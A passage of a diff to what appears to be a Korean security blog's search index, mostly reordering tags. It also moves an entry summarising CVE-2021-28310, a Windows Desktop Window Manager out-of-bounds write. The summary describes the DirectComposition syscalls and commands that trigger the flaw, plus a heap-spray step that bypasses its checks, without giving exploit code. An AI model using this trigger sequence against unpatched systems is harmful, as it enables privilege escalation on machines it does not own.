@@ -154,11 +154,11 @@
     
     <tags>
       
-      <tag>windows</tag>
+      <tag>lpe</tag>
       
       <tag>kernel</tag>
       
-      <tag>lpe</tag>
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -197,11 +197,11 @@
       
       <tag>cve</tag>
       
+      <tag>lpe</tag>
+      
       <tag>eop</tag>
       
       <tag>intel</tag>
-      
-      <tag>lpe</tag>
       
       <tag>L0ch</tag>
       
@@ -259,9 +259,9 @@
     
     <tags>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>fuzzing</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>fuzzer</tag>
       
@@ -290,9 +290,9 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>eop</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>exchange</tag>
       
@@ -395,15 +395,15 @@
     
     <tags>
       
+      <tag>lpe</tag>
+      
+      <tag>linux</tag>
+      
       <tag>kernel</tag>
       
       <tag>Fabu1ous</tag>
       
-      <tag>linux</tag>
-      
       <tag>ebpf</tag>
-      
-      <tag>lpe</tag>
       
     </tags>
     
@@ -459,15 +459,15 @@
     
     <tags>
       
-      <tag>j0ker</tag>
+      <tag>kernel</tag>
       
       <tag>windows</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>ntfs</tag>
       
       <tag>wnf</tag>
-      
-      <tag>kernel</tag>
       
       <tag>cve-2021-31956</tag>
       
@@ -494,9 +494,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>idioth</tag>
       
@@ -529,11 +529,11 @@
     
     <tags>
       
-      <tag>windows</tag>
+      <tag>lpe</tag>
       
       <tag>kernel</tag>
       
-      <tag>lpe</tag>
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -572,11 +572,11 @@
       
       <tag>cve</tag>
       
-      <tag>kernel</tag>
+      <tag>lpe</tag>
       
       <tag>linux</tag>
       
-      <tag>lpe</tag>
+      <tag>kernel</tag>
       
       <tag>integer overflow</tag>
       
@@ -605,13 +605,13 @@
     
     <tags>
       
-      <tag>eop</tag>
+      <tag>bof</tag>
       
       <tag>kernel</tag>
       
-      <tag>Fabu1ous</tag>
+      <tag>eop</tag>
       
-      <tag>bof</tag>
+      <tag>Fabu1ous</tag>
       
       <tag>integer underflow</tag>
       
@@ -640,9 +640,9 @@
       
       <tag>windows</tag>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>fuzzing</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>harness</tag>
       
@@ -673,11 +673,11 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>windows</tag>
       
       <tag>eop</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>sam</tag>
       
@@ -778,9 +778,9 @@
       
       <tag>oob</tag>
       
-      <tag>kernel</tag>
-      
       <tag>linux</tag>
+      
+      <tag>kernel</tag>
       
       <tag>L0ch</tag>
       
@@ -879,13 +879,13 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>windows</tag>
       
-      <tag>token</tag>
-      
       <tag>eop</tag>
+      
+      <tag>j0ker</tag>
+      
+      <tag>token</tag>
       
       <tag>createprocesswithlogon</tag>
       
@@ -945,11 +945,11 @@
     
     <tags>
       
-      <tag>windows</tag>
+      <tag>lpe</tag>
       
       <tag>kernel</tag>
       
-      <tag>lpe</tag>
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -1116,9 +1116,9 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>windows</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>defender</tag>
       
@@ -1184,9 +1184,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>microsoft</tag>
       
@@ -1252,15 +1252,15 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>windows</tag>
+      
+      <tag>eop</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>microsoft</tag>
       
       <tag>defender</tag>
-      
-      <tag>eop</tag>
       
       <tag>file_deletion</tag>
       
@@ -1291,11 +1291,11 @@
       
       <tag>cve</tag>
       
+      <tag>fuzzing</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>winafl</tag>
-      
-      <tag>fuzzing</tag>
       
       <tag>harness</tag>
       
@@ -1390,9 +1390,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>microsoft</tag>
       
@@ -1427,11 +1427,11 @@
     
     <tags>
       
+      <tag>uaf</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>android</tag>
-      
-      <tag>uaf</tag>
       
       <tag>race-condition</tag>
       
@@ -1458,13 +1458,13 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>oob</tag>
       
       <tag>kernel</tag>
+      
+      <tag>windows</tag>
       
       <tag>driver</tag>
       
@@ -1530,11 +1530,11 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>kernel</tag>
+      
+      <tag>windows</tag>
       
       <tag>malware</tag>
       
@@ -1565,9 +1565,9 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>bypass</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>arm64</tag>
       
@@ -1631,13 +1631,13 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>lpe</tag>
       
       <tag>uaf</tag>
+      
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -1699,13 +1699,13 @@
     
     <tags>
       
-      <tag>kernel</tag>
-      
-      <tag>Fabu1ous</tag>
-      
       <tag>linux</tag>
       
+      <tag>kernel</tag>
+      
       <tag>uaf</tag>
+      
+      <tag>Fabu1ous</tag>
       
     </tags>
     
@@ -1730,11 +1730,11 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>lpe</tag>
+      
+      <tag>windows</tag>
       
       <tag>msi</tag>
       
@@ -1833,11 +1833,11 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>windows</tag>
       
       <tag>bypass</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>loadimage</tag>
       
@@ -1870,9 +1870,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>eop</tag>
       
@@ -2095,11 +2095,11 @@
     
     <tags>
       
+      <tag>fuzzing</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>winafl</tag>
-      
-      <tag>fuzzing</tag>
       
       <tag>harness</tag>
       
@@ -2128,13 +2128,13 @@
     
     <tags>
       
+      <tag>uaf</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>use after free</tag>
       
       <tag>webkit</tag>
-      
-      <tag>uaf</tag>
       
     </tags>
     
@@ -2192,9 +2192,9 @@
     
     <tags>
       
-      <tag>ssrf</tag>
-      
       <tag>information disclosure</tag>
+      
+      <tag>ssrf</tag>
       
       <tag>idioth</tag>
       
@@ -2361,15 +2361,15 @@
     
     <tags>
       
-      <tag>j0ker</tag>
+      <tag>oob</tag>
       
       <tag>windows</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>microsoft</tag>
       
       <tag>WindowsCodecsRaw</tag>
-      
-      <tag>oob</tag>
       
     </tags>
     
@@ -2429,11 +2429,11 @@
       
       <tag>cve</tag>
       
+      <tag>information disclosure</tag>
+      
       <tag>kernel</tag>
       
       <tag>ios</tag>
-      
-      <tag>information disclosure</tag>
       
       <tag>apple</tag>
       
@@ -2499,9 +2499,9 @@
     
     <tags>
       
-      <tag>xss</tag>
-      
       <tag>cve</tag>
+      
+      <tag>xss</tag>
       
       <tag>Fabu1ous</tag>
       
@@ -2573,9 +2573,9 @@
       
       <tag>idioth</tag>
       
-      <tag>com</tag>
-      
       <tag>vbscript</tag>
+      
+      <tag>com</tag>
       
       <tag>jscript</tag>
       
@@ -2602,9 +2602,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>kernel</tag>
+      
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -2641,13 +2641,13 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>cve</tag>
       
-      <tag>smap</tag>
-      
       <tag>bypass</tag>
+      
+      <tag>j0ker</tag>
+      
+      <tag>smap</tag>
       
       <tag>freebsd</tag>
       
@@ -2678,13 +2678,13 @@
       
       <tag>oob</tag>
       
-      <tag>kernel</tag>
-      
-      <tag>Fabu1ous</tag>
+      <tag>lpe</tag>
       
       <tag>linux</tag>
       
-      <tag>lpe</tag>
+      <tag>kernel</tag>
+      
+      <tag>Fabu1ous</tag>
       
     </tags>
     
@@ -2709,11 +2709,11 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>lpe</tag>
+      
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -2886,9 +2886,9 @@
     
     <tags>
       
-      <tag>j0ker</tag>
-      
       <tag>windows</tag>
+      
+      <tag>j0ker</tag>
       
       <tag>token</tag>
       
@@ -2921,11 +2921,11 @@
     
     <tags>
       
+      <tag>fuzzing</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>winafl</tag>
-      
-      <tag>fuzzing</tag>
       
       <tag>harness</tag>
       
@@ -2954,11 +2954,11 @@
     
     <tags>
       
+      <tag>lpe</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>rce</tag>
-      
-      <tag>lpe</tag>
       
       <tag>unix</tag>
       
@@ -3024,11 +3024,11 @@
       
       <tag>cve</tag>
       
+      <tag>mcafee</tag>
+      
       <tag>lpe</tag>
       
       <tag>idioth</tag>
-      
-      <tag>mcafee</tag>
       
       <tag>com</tag>
       
@@ -3057,9 +3057,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>Fabu1ous</tag>
       
@@ -3220,13 +3220,13 @@
     
     <tags>
       
-      <tag>kernel</tag>
-      
-      <tag>Fabu1ous</tag>
+      <tag>lpe</tag>
       
       <tag>linux</tag>
       
-      <tag>lpe</tag>
+      <tag>kernel</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>socket</tag>
       
@@ -3478,11 +3478,11 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
       <tag>lpe</tag>
+      
+      <tag>windows</tag>
       
       <tag>arbitrary read</tag>
       
@@ -3612,9 +3612,9 @@
       
       <tag>cve</tag>
       
-      <tag>microsoft</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>microsoft</tag>
       
       <tag>toctou</tag>
       
@@ -3647,13 +3647,13 @@
       
       <tag>cve</tag>
       
+      <tag>mac</tag>
+      
       <tag>Fabu1ous</tag>
       
       <tag>race condition</tag>
       
       <tag>heap overflow</tag>
-      
-      <tag>mac</tag>
       
       <tag>parallels</tag>
       
@@ -3773,9 +3773,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>kernel</tag>
+      
+      <tag>windows</tag>
       
       <tag>exploit</tag>
       
@@ -3901,11 +3901,11 @@
     
     <tags>
       
+      <tag>linux</tag>
+      
       <tag>kernel</tag>
       
       <tag>Fabu1ous</tag>
-      
-      <tag>linux</tag>
       
     </tags>
     
@@ -3930,11 +3930,11 @@
     
     <tags>
       
-      <tag>windows</tag>
+      <tag>insu</tag>
       
       <tag>cve</tag>
       
-      <tag>insu</tag>
+      <tag>windows</tag>
       
     </tags>
     
@@ -3961,9 +3961,9 @@
       
       <tag>cve</tag>
       
-      <tag>linux</tag>
-      
       <tag>information disclosure</tag>
+      
+      <tag>linux</tag>
       
       <tag>L0ch</tag>
       
@@ -4052,9 +4052,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>kernel</tag>
+      
+      <tag>windows</tag>
       
       <tag>exploit</tag>
       
@@ -4118,9 +4118,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>eop</tag>
       
@@ -4188,11 +4188,11 @@
     
     <tags>
       
-      <tag>xss</tag>
-      
       <tag>cve</tag>
       
       <tag>microsoft</tag>
+      
+      <tag>xss</tag>
       
       <tag>Fabu1ous</tag>
       
@@ -4238,37 +4238,6 @@
   
   
   <entry>
-    <title>[하루한줄] CVE-2021-28310: Desktop Window Manager out-of-bound write 취약점</title>
-    <link href="/2021/04/15/idioth/2021-04-15/"/>
-    <url>/2021/04/15/idioth/2021-04-15/</url>
-    
-    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/">Zero-day vulnerability in Desktop Window Manager (CVE-2021-28310) used in the wild</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows OS &#xBE4C;&#xB4DC; 19041.928 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xCC3D; &#xAD00;&#xB9AC;&#xC790;(Desktop Window Manager, <code>dwm.exe</code>)&#xC758; <code>dwmcore.dll</code>&#xC5D0;&#xC11C; out-of-bounds write &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; DirectComposition API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/directcomp/directcomposition-portal">DirectComposition</a>&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC18C;&#xC2A4;(GDI, DirectX &#xB4F1;)&#xC758; &#xBE44;&#xD2B8;&#xB9F5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBCC0;&#xD658;, &#xD6A8;&#xACFC;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xBE44;&#xD2B8;&#xB9F5; &#xAD6C;&#xC131;&#xC744; &#xC704;&#xD574; Windows 8&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xB41C; Windows &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. DirectComposition API&#xB294; <code>win32kbase.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xAD00;&#xB828;&#xB41C; syscall&#xC740; <code>NtDComposition</code>&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; 3&#xAC1C;&#xC758; syscall&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. <code>NtDCompositionCreateChannel</code>&#xC740; <code>NtDCompositionProcessChannelBatchBuffer</code>&#xC640; &#xD568;&#xAED8; &#xCC44;&#xB110;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC5EC; kernel batch mode&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xB3C4;&#xB85D; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; DirectComposition&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xCEE4;&#xB110;&#xC5D0; &#xC758;&#xD574; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xCC98;&#xB9AC;&#xB418;&#xC9C0;&#xB9CC; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC740; &#xB2E4;&#xB978; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; serialize &#xB418;&#xC5B4; Local Procedure Call(LPC) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0;&#xC11C; Desktop Window Manager(<code>dwm.exe</code>)&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xC2DC;&#xC800;&#xB294; <code>NtDCompositionCommitChannel</code>&#xC5D0; &#xC758;&#xD574; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; 3&#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;(<code>CreateResource</code>, <code>ReleaseResource</code>, <code>SetResourceBufferProperty</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. <code>dwmcore.dll</code>&#xC758; <code>CPropertySet::ProcessSetPropertyValue</code> &#xD568;&#xC218;&#xB294; <code>SetResourceBufferProperty</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. D2DVector2&#xB85C; expression type&#xC774; &#xC124;&#xC815;&#xB41C; <code>SetResourceBufferProperty</code>&#xC758; &#xACBD;&#xC6B0; <code>CPropertySet::ProcessSetPropertyValue</code>&#xC5D0;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; <code>CPropertySet::AddProperty&lt;D2DVector2&gt;</code> &#xD639;&#xC740; <code>CPropertySet::UpdateProperty&lt;D2DVector2&gt;</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>UpdateProperty</code>&#xC5D0;&#xC11C; <code>propertyId</code>&#xAC00; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; property &#xC218;&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; property &#xBC30;&#xC5F4; &#xB0B4;&#xBD80; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xB450; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xBA74; <code>propertiesData</code> &#xBC84;&#xD37C;&#xB97C; &#xC9C0;&#xB098; OOB write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; <code>dwm.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; heap spray&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD55C; &#xD6C4; &#xC870;&#xC791;&#xB41C; <code>propertyId</code>&#xB85C; &#xBA85;&#xB839;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; <code>NtDCompositionProcessChannelBatchBuffer</code>&#xC5D0;&#xC11C; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xACE0; &#xBA85;&#xB839;&#xC5B4;&#xAC00; <code>dwm.exe</code>&#xC5D0; &#xC804;&#xC1A1;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. kernel mode <code>UpdateProperty&lt;D2DVector2&gt;</code>&#xC758; <code>propertiesCount</code> &#xAC80;&#xC0AC;&#xB294; user mode&#xC5D0;&#xC11C;&#xC758; &#xC545;&#xC131; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; kernel mode <code>AddProperty</code>&#xB294; user mode&#xC640; &#xC720;&#xC0AC;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xBA70; &#xC0DD;&#xC131;&#xB41C; property&#xC758; <code>propertyId</code>&#xC640; <code>storageOffset</code>&#xC774; &#xC81C;&#xACF5;&#xB41C; &#xAC12;&#xACFC; &#xB3D9;&#xC77C;&#xD55C;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB2E4;&#xB974;&#xBA74; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. <code>AddProperty</code>&#xB97C; &#xD1B5;&#xD574; &#xC0C8; &#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xD568;&#xC218;&#xAC00; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74; kernel mode&#xC640; user mode &#xB3D9;&#xC77C; &#xB9AC;&#xC18C;&#xC2A4; &#xAC04;&#xC5D0; property &#xC218;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; kernel mode <code>propertiesCount</code> &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; <code>dwm.exe</code>&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>1day1line</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>windows</tag>
-      
-      <tag>cve</tag>
-      
-      <tag>idioth</tag>
-      
-      <tag>oob write</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>[하루한줄] Windows SCM Remote Access Check Limit Bypass EoP</title>
     <link href="/2021/04/15/insu/2021-04-15/"/>
     <url>/2021/04/15/insu/2021-04-15/</url>
@@ -4285,15 +4254,46 @@
     
     <tags>
       
+      <tag>insu</tag>
+      
       <tag>windows</tag>
+      
+      <tag>scm</tag>
       
       <tag>bypass</tag>
       
       <tag>eop</tag>
       
-      <tag>insu</tag>
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-28310: Desktop Window Manager out-of-bound write 취약점</title>
+    <link href="/2021/04/15/idioth/2021-04-15/"/>
+    <url>/2021/04/15/idioth/2021-04-15/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/">Zero-day vulnerability in Desktop Window Manager (CVE-2021-28310) used in the wild</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows OS &#xBE4C;&#xB4DC; 19041.928 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xCC3D; &#xAD00;&#xB9AC;&#xC790;(Desktop Window Manager, <code>dwm.exe</code>)&#xC758; <code>dwmcore.dll</code>&#xC5D0;&#xC11C; out-of-bounds write &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; DirectComposition API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/directcomp/directcomposition-portal">DirectComposition</a>&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC18C;&#xC2A4;(GDI, DirectX &#xB4F1;)&#xC758; &#xBE44;&#xD2B8;&#xB9F5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBCC0;&#xD658;, &#xD6A8;&#xACFC;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xBE44;&#xD2B8;&#xB9F5; &#xAD6C;&#xC131;&#xC744; &#xC704;&#xD574; Windows 8&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xB41C; Windows &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. DirectComposition API&#xB294; <code>win32kbase.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xAD00;&#xB828;&#xB41C; syscall&#xC740; <code>NtDComposition</code>&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; 3&#xAC1C;&#xC758; syscall&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. <code>NtDCompositionCreateChannel</code>&#xC740; <code>NtDCompositionProcessChannelBatchBuffer</code>&#xC640; &#xD568;&#xAED8; &#xCC44;&#xB110;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC5EC; kernel batch mode&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xB3C4;&#xB85D; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; DirectComposition&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xCEE4;&#xB110;&#xC5D0; &#xC758;&#xD574; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xCC98;&#xB9AC;&#xB418;&#xC9C0;&#xB9CC; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC740; &#xB2E4;&#xB978; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; serialize &#xB418;&#xC5B4; Local Procedure Call(LPC) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0;&#xC11C; Desktop Window Manager(<code>dwm.exe</code>)&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xC2DC;&#xC800;&#xB294; <code>NtDCompositionCommitChannel</code>&#xC5D0; &#xC758;&#xD574; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; 3&#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;(<code>CreateResource</code>, <code>ReleaseResource</code>, <code>SetResourceBufferProperty</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. <code>dwmcore.dll</code>&#xC758; <code>CPropertySet::ProcessSetPropertyValue</code> &#xD568;&#xC218;&#xB294; <code>SetResourceBufferProperty</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. D2DVector2&#xB85C; expression type&#xC774; &#xC124;&#xC815;&#xB41C; <code>SetResourceBufferProperty</code>&#xC758; &#xACBD;&#xC6B0; <code>CPropertySet::ProcessSetPropertyValue</code>&#xC5D0;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; <code>CPropertySet::AddProperty&lt;D2DVector2&gt;</code> &#xD639;&#xC740; <code>CPropertySet::UpdateProperty&lt;D2DVector2&gt;</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>UpdateProperty</code>&#xC5D0;&#xC11C; <code>propertyId</code>&#xAC00; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; property &#xC218;&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; property &#xBC30;&#xC5F4; &#xB0B4;&#xBD80; 